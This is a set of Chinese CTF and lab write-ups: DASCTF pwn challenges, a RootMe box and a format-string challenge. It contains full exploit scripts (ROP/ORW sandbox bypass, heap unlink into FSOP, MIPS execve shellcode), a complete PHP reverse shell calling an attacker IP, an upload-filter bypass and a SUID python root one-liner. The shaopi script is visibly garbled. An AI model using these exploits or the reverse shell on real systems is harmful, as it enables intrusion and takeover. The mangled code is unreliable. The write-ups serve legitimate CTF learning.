entry.title: DASCTF X 0psu3 2023十一月挑战赛
entry.content:
WP：DAS X 0psu3 - 飞书云文档 (feishu.cn)

PWN

ASadStory

没canary，partial relro
【2.31-0ubuntu9.12】无泄露堆沙盒
试运行一下😂

程序分析

直接看1.yes，我们可以选择两个武器：

void __noreturn sub_1492(){  int v0; // edx  char *buf; // [rsp+4h] [rbp-Ch] BYREF  int v2; // [rsp+Ch] [rbp-4h]  puts("OK,now I will tell you the name of the betrayers:");  puts("s* && B*!!!");  puts("Your mission is to defeat them!!!");  puts("You can choice a weapon: ");  while ( 1 )  {    puts(a1);    printf("your choice: ");    read(0, &buf, 8uLL);    v2 = strtol((const char *)&buf, &buf, v0);    if ( v2 == 1 )    {      sub_1420();    }    else if ( v2 == 2 )    {      sub_1468();    }  }}
  • 武器1
    int sub_1420(){  printf(format, sub_1249);  puts(&byte_2200);  return close(1);}
    能泄露pie，但是会关闭标准输出
  • 武器2
    int sub_1468(){  char v1[48]; // [rsp+0h] [rbp-30h] BYREF  gets(v1);  return sanbox();}
    一个无限栈溢出，不过同时会打开prctl沙箱，禁用了execve和open，并限制了arch

想要ret2libc，就必须泄露pie而关掉输出，可关掉输出就无法得到libc地址，左右为难。

EXP1-改close为syscall

我们在无法泄露libc的情况下如何orw?

思路1：改close末位字节为syscall，利用read函数控制rax寄存器进行系统调用，同时利用ret2csu控制各寄存器。
系统调用write泄露libc，接着orw完成利用（为了方便进行了栈劫持）

禁用了open？用openat不就行拉

# !/usr/bin/env python3# -*- coding: utf-8 -*-#@Author:X1NRIshe_i386_20=b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"she_amd64_30=b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"s = lambda payload:io.send(payload)sl   = lambda payload:io.sendline(payload)sa   = lambda data,payload:io.sendafter(data,payload)sla  = lambda data,payload:io.sendlineafter(data,payload)r    = lambda num   :io.recv(numb=num)ru   = lambda data,DROP:io.recvuntil(data,drop=DROP)rl = lambda :io.recvline(keepends=True)uu32 = lambda :u32(io.recvuntil(b'\xf7')[-4:].ljust(4,b"\x00") ) uu64 = lambda :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b"\x00") )ep = lambda data :elf.plt[data]eg = lambda data :elf.got[data]es = lambda data           :elf.sym[data]ls = lambda data :libc.sym[data]itr  = lambda :io.interactive()ic   = lambda :io.close()pt   = lambda s:log.info('\033[1;31;40m %s --- %s \033[0m' % (s,type(eval(s))))lg   = lambda name,addr :log.success('\033[1;31;40m{} ==> {:#x}\033[0m'.format(name, addr))lg1  = lambda name,addr :log.success('\033[1;31;34m{} ==> {:#x}\033[0m'.format(name, addr))lg2  = lambda name,addr :log.success('\033[1;31;37m{} ==> {:#x}\033[0m'.format(name, addr))pn   = lambda name          :print("\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"%(name,hex(name)))def dbg(command): #dbg(None)gdb.attach(io,gdbscript=command)#pause()   #------------------------------------------------------------------------------------------from pwn import*#from LibcSearcher import LibcSearchercontext(os="linux",arch="amd64")#context.terminal=["tmux","splitw","-h"]binary="./challenge"#context.log_level="debug"elf=ELF(binary)libc=elf.libc#------------------------------------------------------------------choose=1if choose==1:#ENV={"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"}#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)io=process(binary)else:io=remote("")#------------------------------------------------------------------def pwn():sa('1.yes / 2.no','1')sa('your choice: ','1')ru('0x',True)pie=int(r(12),16)-0x1249lg('pie',pie)sa('是什么呢?','2')def csuattack(r12,r13,r14,r15):#def csuattack(edi,rsi,rdx,call[got])global csugadget1=0x000000000000163A+piegadget2=0x0000000000001620+piecsu=p64(gadget1)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15)csu+=p64(gadget2)csu+=cyclic(0x38)return csubss=pie+0x4000+0x200gets_p=ep('gets')+pieclose_g=eg('close')+pieread_g=eg('read')+pierdi=0x0000000000001643+piersp_ppp=0x000000000000163d+pie#-------------edit close_p and stack pivotpayload=cyclic(0x30+8)+csuattack(0,close_g,1,read_g)payload+=flat([rdi,bss,gets_p,rsp_ppp,bss-0x18,0,0,0])sl(payload)s(b'\x15')#-----------leak libcbss+=0x200payload=csuattack(0,bss,1,read_g)#rax=1,writepayload+=csuattack(2,read_g,0x8,close_g)#write(2,read_g,0x8)payload+=flat([rdi,bss,gets_p,rsp_ppp,bss-0x18,0,0,0])sl(payload)s('X')libc.address=uu64()-ls('read')lg('libc_base',libc.address)#------------orwOPENAT=ls('openat')READ=ls('read')WRITE=ls('write')rdi=0x0000000000023b6a+libc.addresslg('rdi',rdi)rsi=0x000000000002601f+libc.addressrdx=0x0000000000142c92+libc.addresspayload=flat([rdi,(-100&0xffffffffffffffff),rsi,bss+0x100,rdx,0,OPENAT])payload+=flat([rdi,1,rsi,bss+0x200,rdx,0x60,READ])payload+=flat([rdi,2,rsi,bss+0x200,rdx,0x60,WRITE])payload=payload.ljust(0x100,b'a')payload+=b'./flag\x00'#dbg('')sl(payload)itr()if __name__ == '__main__':pwn()

EXP2-利用magic_gadget

预期解是用一个gadget，直接在libc函数上加减，这样也能完成利用

0x0000000000001232 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
TI:"官方WP"
from pwn import *import syscontext.log_level='debug'context.arch='amd64'libc = ELF('./libc-2.31.so')elf = ELF('./challenge')flag = 1if flag:    p = remote('0.0.0.0', 9999)else:    p = process("./challenge")sa = lambda s,n : p.sendafter(s,n)sla = lambda s,n : p.sendlineafter(s,n)sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive()leak = lambda name,addr :log.success(name+"--->"+hex(addr))sla(b': ',b'1')sla(b': ',b'1')ru(b'0x')code_base = int(rc(12),16) - 0x1249leak("code_base",code_base)ret2csu_front = code_base + 0x1620ret2csu_behind = code_base + 0x163amagic_gadget = code_base + 0x1232setbuf_got = elf.got['setbuf'] + code_basepop_rdi = 0x0000000000001643 + code_basepop_rsi = code_base + 0x0000000000001641ret = code_base + 0x000000000000101a# 0x0000000000001232 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; retdef set_offset(target,raw):    offset = target - raw    if offset < 0:        offset = offset + 0x100000000    return offsetdef set_vuln(offset,target):    payload = flat([        ret2csu_behind,        offset,        target+0x3d,        0,0,0,0,        magic_gadget,    ])    return payloaddef ret2csu(rdi,rsi,rdx,vuln):    payload = flat([        ret2csu_behind,        0,1,        rdi,rsi,rdx,        vuln,        ret2csu_front,        0,0,0,0,0,0,0,    ])    return payloadpayload = 0x38*b'a'payload += set_vuln(set_offset(libc.sym['read'],libc.sym['setbuf']),setbuf_got)payload += ret2csu(0,code_base + elf.bss(0x100),0x30,setbuf_got)payload += set_vuln(set_offset(libc.sym['opendir'],libc.sym['read']),setbuf_got)payload += p64(pop_rdi) + p64(elf.bss(0x100)+code_base) + p64(pop_rsi) + p64(0)*2 + p64(ret) + p64(code_base + elf.plt['setbuf'])payload += set_vuln(set_offset(libc.sym['openat'],libc.sym['opendir']),setbuf_got)payload += ret2csu(1,code_base + elf.bss(0x120),0,setbuf_got)payload += set_vuln(set_offset(libc.sym['read'],libc.sym['openat']),setbuf_got)payload += ret2csu(3,elf.bss(0x200) + code_base,0x30,setbuf_got)payload += set_vuln(set_offset(libc.sym['write'],libc.sym['read']),setbuf_got)payload += p64(ret) + ret2csu(2,code_base + elf.bss(0x200),0x30,setbuf_got)p.sendline(b'2')sleep(0.1)p.sendline(payload)strings = b"."strings = strings.ljust(0x20,b'\x00')strings += b"./flag\x00"p.sendline(strings)p.interactive()

garbage

没pie

【2.35-0ubuntu3.4】

试运行一下，怎么又是🤡

程序分析

  • create
    ssize_t creat_garbage(){  unsigned int num; // [rsp+0h] [rbp-10h]  int v2; // [rsp+4h] [rbp-Ch]  void *buf; // [rsp+8h] [rbp-8h]  puts("you can only creat 10 garbage");  printf("pls input the idx of garbage: ");  num = get_num();                              // 输入index，index需要<9  if ( num > 9 || heaparray[num] )    fault();  printf("pls input the size of garbage: ");  v2 = get_num();  if ( v2 <= 0x40F || v2 > 0x900 )              // 0x40f<size<=0x900    fault();  buf = malloc(v2);  if ( !buf )    fault();  heaparray[num] = buf;  sizearray[num] = v2;  printf("pls input the content of garbage: ");  return read(0, buf, v2);                      // 简单使用read读入}
  • delete
    无漏洞，略
  • show
    无漏洞，略
  • edit
    __int64 edit_garbage(){  unsigned int num; // [rsp+Ch] [rbp-4h]  printf("pls input the idx of garbage: ");  num = get_num();  if ( num > 9 || !heaparray[num] || !sizearray[num] )    fault();  printf("pls input the new content of garbage: ");  return vuln_read(heaparray[num], (unsigned int)sizearray[num]);}
    看一下这个vuln_read：
    unsigned __int64 __fastcall vuln_read(__int64 a1, int a2){  char buf; // [rsp+13h] [rbp-Dh] BYREF  int i; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  for ( i = 0; i < a2; ++i )  {    buf = 0;    if ( read(0, &buf, 1uLL) < 0 )      fault();    if ( buf == '\n' )    {      *(_BYTE *)(i + a1) = 0;      break;    }    *(_BYTE *)(a1 + i) = buf;  }  *(_BYTE *)(i + a1) = 0;  return v5 - __readfsqword(0x28u);}
    一个off by null

EXP

只能申请large size的chunk，一个off by null
开始的思路：高版本off by null造成堆叠，largebin attack打一个house of apple2
但是本题限制了9个堆块，off by null打largebin attack根本不够用
wp的思路：高版本off by null，但是unlink。由于没有开pie，可以直接unlink打heaparray从而能够任意地址写。接着house of apple2即可

TI:"官方WP"
from pwn import *import syscontext.log_level='debug'context.arch='amd64'libc = ELF('./libc.so.6')flag = 0if flag:    p = remote('0.0.0.0', 9999)else:    p = process("./challenge")sa = lambda s,n : p.sendafter(s,n)sla = lambda s,n : p.sendlineafter(s,n)sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive()leak = lambda name,addr :log.success(name+"--->"+hex(addr))def add(index,size,content):    sla(b': ',b'1')    sla(b': ',str(index).encode())    sla(b': ',str(size).encode())    sa(b': ',content)def delete(index):    sla(b': ',b'2')    sla(b': ',str(index).encode())def show(index):    sla(b': ',b'3')    sla(b': ',str(index).encode())def edit(index,content):    sla(b': ',b'4')    sla(b': ',str(index).encode())    sla(b': ',content)target = 0x404060add(0,0x428,b'aaaa')add(1,0x4f0,b'aaaa')add(2,0x410,b'aaaa')payload = p64(0) + p64(0x421) + p64(target - 0x18) + p64(target - 0x10)payload = payload.ljust(0x420,b'\x00')payload += p64(0x420)edit(0,payload)delete(1)edit(0,b'\x00'*0x18 + p64(target - 0x18) + p64(0x4040c0)+p64(0)*10 + p32(0x1000)*10)add(2,0x520,b'a')add(3,0x520,b'a')add(4,0x508,b'a')add(5,0x510,b'a')add(6,0x500,b'a')delete(3)delete(5)add(7,0x600,b'a')add(3,0x520,b'a')show(3)ru(b'Content: ')heap_base = u64(p.recvuntil(b'\n',drop=True).ljust(8,b'\x00')) - 0x1a61leak("heap_base",heap_base)add(5,0x510,b'a')show(5)libc.address = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x21a161delete(7)delete(3)add(7,0x600,b'a')edit(1,p32(0x2000)*10)payload = b'\x00'*0x418 + p64(0x500) + b'\x00'*0x4f8 + p64(0x420) + b'\x00'*0x418payload += p64(0x531)payload += p64(0x21a110 + libc.address)*2 + p64(heap_base + 0xfe0) + p64(0x404040-0x20)edit(2,payload)delete(5)add(8,0x600,b'a')fake_io_addr = heap_base + 0x1a20fake_IO_struct = b'  sh;\x00\x00\x00' + p64(0x521)              #rdifake_IO_struct = fake_IO_struct.ljust(0x74,b'\x00')fake_IO_struct += p64(1)                             #_flag2fake_IO_struct = fake_IO_struct.ljust(0x88,b'\x00')fake_IO_struct += p64(heap_base + 0x200)             #_lock = a writable addressfake_IO_struct = fake_IO_struct.ljust(0xa0,b'\x00')fake_IO_struct += p64(fake_io_addr + 0x200)          #fake_wide_datafake_IO_struct = fake_IO_struct.ljust(0xd8,b'\x00')fake_IO_struct += p64(libc.sym['_IO_wfile_jumps'] - 0x20)        #fake_vatablefake_IO_struct = fake_IO_struct.ljust(0x200,b'\x00')fake_IO_struct += b'\x00'*0xe0 + p64(fake_io_addr + 0x2e0)fake_IO_struct += b'\x00'*0x60 + p64(libc.sym['system'])payload = b'a'*0x500 + fake_IO_structedit(4,payload)edit(1,p32(0x2000)*10)edit(8,b'\x00'*0x608 + p64(0x100))sla(b': ',b'1')sla(b': ',b'9')leak("libc.address",libc.address)leak("system",libc.sym['system'])sla(b': ',b'1800')p.interactive()

shaopi

MIPS32，静态链接

保护一看，多半是shellcode

程序分析

找到start函数，确定程序main函数位置

  • main
    int sub_400B38(){  int v1; // [sp+18h] [+18h]  int v2; // [sp+1Ch] [+1Ch]  char v3[48]; // [sp+20h] [+20h] BYREF  char v4[64]; // [sp+50h] [+50h] BYREF  sub_400A94();  sub_414CA0("你喜欢吃苕皮🐎");  sub_414CA0("welcome to korey's 苕皮摊");  sub_414CA0("You can keep eating endlessly by entering a passphrase.");  sub_4083B0("your passphrase: ");  sub_4084C0("%48s", v3);  v1 = sub_427A60(v3);  v2 = sub_4007B0(v3, v1);  if ( sub_4274A0(v2, "5LiJ5YWD5LiA5Liy5Y2B5YWD5LiJ5Liy") )// 比较    sub_407878(-1);                             // exit  sub_414CA0("Congratulation!");  return sub_42BE60(0, v4, 240);}
    运行看一下，可见是需要输入一串密码：

    把5LiJ5YWD5LiA5Liy5Y2B5YWD5LiJ5Liy输进去，没有通过check

看下字符串，感觉是base64加密


解码

接下来就是一个栈溢出了：return (sub_42BE60)(0, v4, 0xF0);

由于mips的特殊性，NX保护不支持，于是ret2shellcode便成为了通用攻击手段

通过mipsrop插件找gadget：

Python>mipsrop.tails()----------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump|----------------------------------------------------------------------------------------|  0x0042D418  |  move $t9,$s1                                        |  jr    $s1                             ||  0x0042D42C  |  move $t9,$s1                                        |  jr    $s1                             ||  0x0042D528  |  move $t9,$s1                                        |  jr    $s1                             ||  0x0042D53C  |  move $t9,$s1                                        |  jr    $s1                             ||  0x00431084  |  move $t9,$a2                                        |  jr    $a2                             ||  0x0045C914  |  move $t9,$s3                                        |  jr    $s3                             ||  0x00469C30  |  move $t9,$v0                                        |  jr    $v0                             ||  0x00469C8C  |  move $t9,$v0                                        |  jr    $v0                             |----------------------------------------------------------------------------------------Found 8 matching gadgetsPython>mipsrop.stackfinder()----------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump|----------------------------------------------------------------------------------------|  0x00417170  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s2                             ||  0x004172A0  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s2                             ||  0x00429A1C  |  addiu $a1,$sp,0x5C+var_28                           |  jalr  $s5                             ||  0x00429C14  |  addiu $a1,$sp,0x6C+var_38                           |  jalr  $s2                             ||  0x00429CA8  |  addiu $v0,$sp,0x6C+var_40                           |  jalr  $s2                             ||  0x00429F00  |  addiu $v0,$sp,0x170+var_130                         |  jalr  $s0                             ||  0x0042E68C  |  addiu $fp,$sp,0x438+var_408                         |  jalr  $s2                             ||  0x0042E840  |  addiu $s6,$sp,0x420+var_408                         |  jalr  $s1                             ||  0x0042F140  |  addiu $s7,$sp,0x440+var_404                         |  jalr  $s5                             ||  0x0042F178  |  addiu $v1,$sp,0x440+var_428                         |  jalr  $s6                             ||  0x00431D44  |  addiu $s5,$sp,0x60+var_28                           |  jalr  $s4                             ||  0x0043965C  |  addiu $a2,$sp,0x68+var_10                           |  jalr  $fp                             ||  0x0043D8F0  |  addiu $a2,$sp,0x88+var_C                            |  jalr  $s1                             ||  0x00441C14  |  addiu $v1,$sp,0x138+var_104                         |  jalr  $s0                             ||  0x0044C9CC  |  addiu $a1,$sp,0x458+var_18                          |  jalr  $s2                             ||  0x0044CA0C  |  addiu $a0,$sp,0x458+var_2C                          |  jalr  $fp                             ||  0x0044CA44  |  addiu $a0,$sp,0x458+var_18                          |  jalr  $fp                             ||  0x0045C98C  |  addiu $a1,$sp,0x60+var_28                           |  jalr  $s4                             ||  0x0046C828  |  addiu $a1,$sp,0xC4+var_98                           |  jalr  $s6                             ||  0x00422B18  |  addiu $a0,$sp,0x40+var_8                            |  jalr  $v0                             |----------------------------------------------------------------------------------------Found 20 matching gadgets

先看看栈回溯时的汇编：


可见在栈回溯时取出了寄存器的备份：ra、fp进行恢复，并把sp抬高了0x98（下面统一称为sp’）

关注这两个gadget：我们可以把gadget1放入$ra，gadget2放入$fp

1|  0x0043965C  |  addiu $a2,$sp,0x68+var_10                           |  jalr  $fp2|  0x0040ABB8  |  move $t9,$a2                                        |  jalr  $a2

执行完gadget1后，a2 = sp’+0x68-0x10 = sp’+0x58 = sp+0xf0，然后会跳转到fp，即gadget2。再跳转到a2，即跳转到sp+0xf0处

我们的输入点在sp+0x50，可输入0xf0字节，因此shellcode长度最多为0xf0-0xa0=0x50字节。

shellcraft生成的shellcode有点长，找了一个shellcode，汇编、链接后提取机器码

.section .text.globl __start.set noreorder__start:li $a2,0x111p:bltzal $a2,pli $a2,0 addiu $sp,$sp,-32addiu $a0,$ra,20li $a1,0li $v0,4011syscallsc:    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68

EXP

# !/usr/bin/env python3# -*- coding: utf-8 -*-#@Author:X1NRIshe_i386_20=b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"she_amd64_30=b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"s = lambda payload:io.send(payload)sl   = lambda payload:io.sendline(payload)sa   = lambda data,payload:io.sendafter(data,payload)sla  = lambda data,payload:io.sendlineafter(data,payload)r    = lambda num   :io.recv(numb=num)ru   = lambda data,DROP:io.recvuntil(data,drop=DROP)rl = lambda :io.recvline(keepends=True)uu32 = lambda :u32(io.recvuntil(b'\xf7')[-4:].ljust(4,b"\x00") ) uu64 = lambda :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b"\x00") )ep = lambda data :elf.plt[data]eg = lambda data :elf.got[data]es = lambda data           :elf.sym[data]ls = lambda data :libc.sym[data]itr  = lambda :io.interactive()ic   = lambda :io.close()pt   = lambda s:log.info('\033[1;31;40m %s --- %s \033[0m' % (s,type(eval(s))))lg   = lambda name,addr :log.success('\033[1;31;40m{} ==> {:#x}\033[0m'.format(name, addr))lg1  = lambda name,addr :log.success('\033[1;31;34m{} ==> {:#x}\033[0m'.format(name, addr))lg2  = lambda name,addr :log.success('\033[1;31;37m{} ==> {:#x}\033[0m'.format(name, addr))pn   = lambda name          :print("\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"%(name,hex(name)))def dbg(command): #dbg(None)gdb.attach(io,gdbscript=command)#pause() import*context(os="linux",arch="mips")#context.terminal=["tmux","splitw","-h"]binary="./challenge"context.endian='little'context.log_level="debug"elf=ELF(binary)libc=elf.libc#------------------------------------------------------------------choose=11if choose==1:#ENV={"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"}#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)io=process('./challenge')#io=process(["qemu-mipsel","-g","1234","./challenge"])else:io=remote("node4.buuoj.cn",27654)#------------------------------------------------------------------def __name__ == '__main__':pwn()

fakeSSDP

这个。。。以后再说

entry.title: RootMe靶机
entry.content:
虽然是个很简单的靶机，不过第一次打靶还是蛮兴奋的😄

连上openvpn，开打！

侦察

  1. 机器打开了几个端口？答：2

-sV探测下服务

  1. 正在运行哪个版本的 Apache？答：2.4.29
    同上

  2. 端口 22 上运行什么服务？答：ssh
    同上

  3. 使用 GoBuster 工具在 Web 服务器上查找目录，什么是隐藏目录？答：/panel/

    /panel/引起了我们的注意，打开看看

    好家伙，是一个文件上传

获取shell

  1. 找到一个要上传的表单并获取反向 shell，然后找到标志user.txt。

我们已知是php网站，有这样一个php反弹shell的木马模板pentestmonkey/php-reverse-shell (github.com)：
改一下我们攻击机ip和监听端口即可

<?php/ php-reverse-shell - A Reverse Shell implementation in PHP/ Copyright (C) 2007 pentestmonkey@pentestmonkey.net// This tool may be used for legal purposes only.  Users take full responsibility/ for any actions performed using this tool.  The author accepts no liability/ for damage caused by this tool.  If these terms are not acceptable to you, then/ do not use this tool.// In all other respects the GPL version 2 applies:// This program is free software; you can redistribute it and/or modify/ it under the terms of the GNU General Public License version 2 as/ published by the Free Software Foundation.// This program is distributed in the hope that it will be useful,/ but WITHOUT ANY WARRANTY; without even the implied warranty of/ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the/ GNU General Public License for more details.// You should have received a copy of the GNU General Public License along/ with this program; if not, write to the Free Software Foundation, Inc.,/ 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.// This tool may be used for legal purposes only.  Users take full responsibility/ for any actions performed using this tool.  If these terms are not acceptable to/ you, then do not use this tool.// You are encouraged to send comments, improvements or suggestions to/ me at pentestmonkey@pentestmonkey.net// Description/ -----------/ This script will make an outbound TCP connection to a hardcoded IP and port./ The recipient will be given a shell running as the current user (apache normally).// Limitations/ -----------/ proc_open and stream_set_blocking require PHP version 4.3+, or 5+/ Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows./ Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.// Usage/ -----/ See http:/pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = "1.0";$ip = '10.13.40.89';  / CHANGE THIS$port = 1234;       / CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;// Daemonise ourself if possible to avoid zombies later// pcntl_fork is hardly ever available, but will allow us to daemonise/ our php process and avoid zombies.  Worth a try...if (function_exists('pcntl_fork')) {/ Fork and have the parent process exit$pid = pcntl_fork();if ($pid == -1) {printit("ERROR: Can't fork");exit(1);}if ($pid) {exit(0);  / Parent exits}/ Make the current process a session leader/ Will only succeed if we forkedif (posix_setsid() == -1) {printit("Error: Can't setsid()");exit(1);}$daemon = 1;} else {printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}/ Change to a safe directorychdir("/");/ Remove any umask we inheritedumask(0);// Do the reverse shell...// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {printit("$errstr ($errno)");exit(1);}/ Spawn shell process$descriptorspec = array(   0 => array("pipe", "r"),  / stdin is a pipe that the child will read from   1 => array("pipe", "w"),  / stdout is a pipe that the child will write to   2 => array("pipe", "w")   / stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit("ERROR: Can't spawn shell");exit(1);}/ Set everything to non-blocking/ Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) {/ Check for end of TCP connectionif (feof($sock)) {printit("ERROR: Shell connection terminated");break;}/ Check for end of STDOUTif (feof($pipes[1])) {printit("ERROR: Shell process terminated");break;}/ Wait until a command is end down $sock, or some/ command output is available on STDOUT or STDERR$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);/ If we can read from the TCP socket, send/ data to process's STDINif (in_array($sock, $read_a)) {if ($debug) printit("SOCK READ");$input = fread($sock, $chunk_size);if ($debug) printit("SOCK: $input");fwrite($pipes[0], $input);}/ If we can read from the process's STDOUT/ send data down tcp connectionif (in_array($pipes[1], $read_a)) {if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);if ($debug) printit("STDOUT: $input");fwrite($sock, $input);}/ If we can read from the process's STDERR/ send data down tcp connectionif (in_array($pipes[2], $read_a)) {if ($debug) printit("STDERR READ");$input = fread($pipes[2], $chunk_size);if ($debug) printit("STDERR: $input");fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);/ Like print, but does nothing if we've daemonised ourself/ (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) {if (!$daemon) {print "$string\n";}}?>

把木马传上去，发现拒绝.php的文件上传

改下后缀，比如phtml

看下/uploads/，我们已经成功上传

我们在攻击机的1234端口进行监听，并访问木马网页，成功反弹shell

find找user.txt，打印即可

find / -type f -name user.txt 2>/dev/null

权限提升

  1. 搜索具有SUID权限的文件，如何提权？

搜索具有suid权限的文件

$ find / -perm /4000 2>/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/bin/traceroute6.-1.0/dbus-daemon-launch-helper/snap/core/8268/usr/lib/openssh/ssh-keysign/snap/core/8268/usr/lib/snapd/snap--1.0/dbus-daemon-launch-helper/snap/core/9665/usr/lib/openssh/ssh-keysign/snap/core/9665/usr/lib/snapd/snap-confine/snap/core/9665/usr/sbin/pppd/bin/mount/bin/su/bin/fusermount/bin/ping/bin/umount

其中的python可以为我们所用（详见suid提权）

如果二进制文件设置了 SUID 位，则它不会删除提升的权限，并且可能会被滥用来访问文件系统、升级或将特权访问作为 SUID 后门进行维护。如果它用于运行 sh -p ，则在 Debian （<= Stretch） 等允许默认 sh shell 以 SUID 权限运行的系统上省略该 -p 参数。

  1. 得到root并打印root.txt。
    运行./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'，成功得到root！

entry.title: 2023-线上-河南金盾信安杯
entry.content:
sign-format



无pie，有沙盒

程序分析

很简单的程序

  • main

    __int64 __fastcall main(int a1, char **a2, char **a3){  sub_40135D();  puts("Welcome here!");  puts("It's a simple sign-in question.");  puts("Let's start!");  close(1);  read(0, format, 0x100uLL);  printf(format);  return 0LL;}

    把输出关闭了，还有一个bss上的fmt

  • sub_40135D

    __int64 sub_40135D(){  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  if ( mprotect((void *)((unsigned __int64)format & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7) )    perror("mprotect");  return sub_401236();}

    将bss段赋予rwx权限

EXP

只有一次非栈fmt的机会，我们无法只通过这一次控制执行流（期间也想过劫持二级指针和劫持fini_array），由于输出关闭也不能泄露数据

在调用exit函数退出程序时，会调用到_dl_fini函数：

for (i = 0; i < nmaps; ++i){    struct link_map *l = maps[i]; // link_map结构体指针l    if (l->l_init_called)//检查点1    {      /* Make sure nothing happens if we are called twice.  */      l->l_init_called = 0;      /* Is there a destructor function?  */      if (l->l_info[DT_FINI_ARRAY] != NULL//检查点2          || (ELF_INITFINI && l->l_info[DT_FINI] != NULL))        {          .............            /* First see whether an array is given.  */            if (l->l_info[DT_FINI_ARRAY] != NULL)//检查点3            {              ElfW(Addr) *array =                (ElfW(Addr) *) (l->l_addr                        + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);              unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val                        / sizeof (ElfW(Addr)));              while (i-- > 0)                ((fini_t) array[i]) (); // 调用了函数指针，是我们的攻击处            }        ...        }      ...     }   ... }

该函数会根据link_map的l_addr偏移量来调用fini_array段的指针（DT_FINI_ARRAY 这个宏就是 26）
ElfW(Addr) *array = (ElfW(Addr) *) (l->l_addr + l->l_info[26]->d_un.d_ptr);

接触过house of banana的师傅应该很熟悉

  • 我们来看看l->l_addr的地址：

    这个地址好像很熟悉？没错正是栈上的一个粉颜色地址（断点在printf）：

    我们能够利用fmt控制l->l_addr

  • 再看看l->l_info[26]->d_un.d_ptr，可见其值为0x403d98


0x403d98？这其实就是.fini_array段的地址

那么我们思路很明显了，控制l->addr使得array指向bss段，在bss上写上orw的shellcode和orw的指针，在((fini_t) array[i]) ();就会调用orw指针执行shellcode。
由于关闭了标准输出，用标准错误输出即可

